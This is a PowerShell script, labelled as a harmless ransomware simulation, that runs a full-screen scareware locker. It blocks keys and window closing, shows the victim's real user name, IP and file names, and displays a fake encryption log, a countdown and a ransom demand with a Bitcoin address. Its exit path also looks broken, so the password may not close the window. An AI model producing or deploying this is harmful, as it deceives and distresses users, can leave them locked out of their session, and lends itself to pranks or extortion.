# --- Fake Ransomware v3 (SIMULATION UNIQUEMENT) ---
# Ne modifie AUCUN fichier, aucune suppression, aucun chiffrement
# Mot de passe pour fermer : ransom

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# === Récupère les vraies infos de la machine (effet psychologique) ===
$user = $env:USERNAME
$pc = $env:COMPUTERNAME
try {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
        Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*' } |
        Select-Object -First 1).IPAddress
} catch { $ip = "0.0.0.0" }
$date = Get-Date -Format "dd/MM/yyyy HH:mm:ss"

# === Fenêtre plein écran ===
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.ShowInTaskbar = $false
$form.BackColor = 'Black'
$form.KeyPreview = $true
$form.ControlBox = $false

# Bloque toutes les touches sauf Entrée
$form.Add_KeyDown({
    if ($_.KeyCode -ne 'Return') {
        $_.SuppressKeyPress = $true
        $_.Handled = $true
    }
})
# Empêche la fermeture (Alt+F4, croix...)
$form.Add_FormClosing({ $_.Cancel = $true })
# Reprend le focus s'il est perdu
$form.Add_Deactivate({
    $form.TopMost = $false
    $form.TopMost = $true
    $form.Activate()
})

# === Header clignotant ===
$header = New-Object System.Windows.Forms.Label
$header.Text = "⚠ VOS FICHIERS ONT ÉTÉ CHIFFRÉS ⚠"
$header.ForeColor = 'Red'
$header.Font = New-Object System.Drawing.Font("Consolas", 28, [System.Drawing.FontStyle]::Bold)
$header.AutoSize = $true
$header.Location = New-Object System.Drawing.Point(50, 25)
$form.Controls.Add($header)

$script:blink = $true
$blinkTimer = New-Object System.Windows.Forms.Timer
$blinkTimer.Interval = 400
$blinkTimer.Add_Tick({
    if ($script:blink) { $header.ForeColor = 'DarkRed' } else { $header.ForeColor = 'Red' }
    $script:blink = -not $script:blink
})
$blinkTimer.Start()

# === Infos personnelles (impact émotionnel) ===
$info = New-Object System.Windows.Forms.Label
$info.Text = "Utilisateur : $user@$pc`nIP locale    : $ip`nDate         : $date`nID Machine  : $([guid]::NewGuid().ToString().Substring(0,8).ToUpper())"
$info.ForeColor = 'Red'
$info.Font = New-Object System.Drawing.Font("Consolas", 11)
$info.AutoSize = $true
$info.Location = New-Object System.Drawing.Point(50, 80)
$form.Controls.Add($info)

# === Compte à rebours géant (centre haut) ===
$countdown = New-Object System.Windows.Forms.Label
$countdown.ForeColor = 'Yellow'
$countdown.Font = New-Object System.Drawing.Font("Consolas", 64, [System.Drawing.FontStyle]::Bold)
$countdown.AutoSize = $true
$countdown.Location = New-Object System.Drawing.Point(500, 130)
$form.Controls.Add($countdown)

$script:seconds = 3600  # 1 heure
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 1000
$timer.Add_Tick({
    $script:seconds--
    $h = [math]::Floor($script:seconds / 3600)
    $m = [math]::Floor(($script:seconds % 3600) / 60)
    $s = $script:seconds % 60
    $countdown.Text = "{0:00}:{1:00}:{2:00}" -f $h, $m, $s
    # Flash rouge sous 5 min
    if ($script:seconds -lt 300) {
        if ($script:seconds % 2 -eq 0) { $countdown.ForeColor = 'Red' } else { $countdown.ForeColor = 'Yellow' }
    }
    if ($script:seconds -le 0) { $timer.Stop() }
})
$countdown.Text = "01:00:00"
$timer.Start()

# === Log d'encryption (utilise les VRAIS noms de fichiers pour la peur) ===
$log = New-Object System.Windows.Forms.TextBox
$log.Multiline = $true
$log.ScrollBars = 'Vertical'
$log.ReadOnly = $true
$log.BackColor = 'Black'
$log.ForeColor = 'LimeGreen'
$log.Font = New-Object System.Drawing.Font("Consolas", 9)
$log.Location = New-Object System.Drawing.Point(50, 350)
$log.Size = New-Object System.Drawing.Size(620, 300)
$form.Controls.Add($log)

# Récupère seulement les noms (ne touche à rien)
$targetFolders = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Downloads"
)
$fakeExtensions = @(".locked", ".encrypted", ".crypto", ".wncry", ".lockbit", ".ALPHV")
$files = @()
foreach ($folder in $targetFolders) {
    if (Test-Path $folder) {
        $files += Get-ChildItem -Path $folder -File -Recurse -ErrorAction SilentlyContinue |
                  Select-Object -First 40
    }
}
if ($files.Count -eq 0) {
    $files = @("facture.pdf", "photo_vacances.jpg", "backup.zip", "notes.txt",
               "cv.docx", "comptes.xlsx", "video.mp4") |
             ForEach-Object { [PSCustomObject]@{ FullName = "C:\Users\$user\Documents\$_"; Name = $_ } }
}

# Injecte progressivement les noms
$script:fileIndex = 0
$logTimer = New-Object System.Windows.Forms.Timer
$logTimer.Interval = 150
$logTimer.Add_Tick({
    if ($script:fileIndex -lt $files.Count) {
        $file = $files[$script:fileIndex]
        $ext = $fakeExtensions[(Get-Random -Maximum $fakeExtensions.Count)]
        $newName = $file.Name + $ext
        $log.AppendText("[ENCRYPTING] $($file.FullName) -> $newName`r`n")
        $log.SelectionStart = $log.Text.Length
        $log.ScrollToCaret()
        $script:fileIndex++
    } else {
        # Recommence la boucle pour effet continu
        $log.Clear()
        $script:fileIndex = 0
    }
})
$logTimer.Start()

# === Message de rançon ===
$ransom = New-Object System.Windows.Forms.Label
$ransom.Text = @"
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  RANSOM NOTE - LIRE ATTENTIVEMENT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Tous vos documents, photos, vidéos et
bases de données ont été chiffrés avec
un algorithme AES-256 + RSA-4096.

Pour récupérer vos fichiers, envoyez
0.5 BTC à l'adresse suivante :

bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

Puis envoyez la preuve de paiement à :
decrypt@ransom-secure.onion

Sans paiement dans les délais impartis,
la clé privée sera DÉTRUITE.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"@
$ransom.ForeColor = 'White'
$ransom.Font = New-Object System.Drawing.Font("Consolas", 10)
$ransom.AutoSize = $true
$ransom.Location = New-Object System.Drawing.Point(720, 350)
$form.Controls.Add($ransom)

# === Champ de déchiffrement ===
$pwdLabel = New-Object System.Windows.Forms.Label
$pwdLabel.Text = "Entrez la clé de déchiffrement :"
$pwdLabel.ForeColor = 'Gray'
$pwdLabel.Font = New-Object System.Drawing.Font("Consolas", 11)
$pwdLabel.AutoSize = $true
$pwdLabel.Location = New-Object System.Drawing.Point(720, 620)
$form.Controls.Add($pwdLabel)

$pwdBox = New-Object System.Windows.Forms.TextBox
$pwdBox.Location = New-Object System.Drawing.Point(720, 650)
$pwdBox.Size = New-Object System.Drawing.Size(400, 30)
$pwdBox.Font = New-Object System.Drawing.Font("Consolas", 14)
$pwdBox.UseSystemPasswordChar = $true
$pwdBox.BackColor = 'DarkRed'
$pwdBox.ForeColor = 'White'
$form.Controls.Add($pwdBox)

$pwdBox.Add_KeyDown({
    if ($_.KeyCode -eq 'Return') {
        if ($pwdBox.Text -eq "ransom") {
            $timer.Stop()
            $blinkTimer.Stop()
            $logTimer.Stop()
            $beepTimer.Stop()
            $form.FormClosing = $null
            $form.Close()
        } else {
            $pwdBox.Text = ""
            [System.Media.SystemSounds]::Hand.Play()
            $form.BackColor = 'DarkRed'
            Start-Sleep -Milliseconds 150
            $form.BackColor = 'Black'
        }
    }
})

# === Bips d'alerte ===
$script:beepCount = 0
$beepTimer = New-Object System.Windows.Forms.Timer
$beepTimer.Interval = 3000
$beepTimer.Add_Tick({
    [System.Media.SystemSounds]::Hand.Play()
    $script:beepCount++
    if ($script:beepCount -gt 20) { $beepTimer.Stop() }
})
$beepTimer.Start()

# === GO ===
$form.ShowDialog() | Out-Null
